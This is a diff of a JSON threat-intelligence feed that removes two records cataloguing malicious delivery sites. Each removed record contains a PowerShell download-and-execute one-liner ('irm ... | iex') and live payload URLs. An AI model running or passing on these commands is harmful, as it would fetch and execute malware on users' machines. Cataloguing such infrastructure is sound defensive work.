@@ -8974,43 +8974,5 @@
     ],
     "ReportId": "cmwkp88891fgr0omlhjevhb4h",
     "ScannedAt": "2026-11-17T12:59:02.465000+00:00"
-  },
-  {
-    "UrlDomain": "soporte5.jlmarketing.com.mx",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/wp/a99138664d16b6b2"
-    ],
-    "IP": [
-      "192.185.131.124"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/wp/a99138664d16b6b2')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/wp/a99138664d16b6b2"
-    ],
-    "ReportId": "cmwkmw4kx1f9x0omlu6etnpyg",
-    "ScannedAt": "2026-11-17T11:53:38.648000+00:00"
-  },
-  {
-    "UrlDomain": "imfobus.es",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/wp/4ff6ecee35528485"
-    ],
-    "IP": [
-      "217.160.0.14"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/wp/4ff6ecee35528485')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/wp/4ff6ecee35528485"
-    ],
-    "ReportId": "cmwkmw17h1f990oml8ubw5izj",
-    "ScannedAt": "2026-11-17T11:53:34.298000+00:00"
   }
 ]
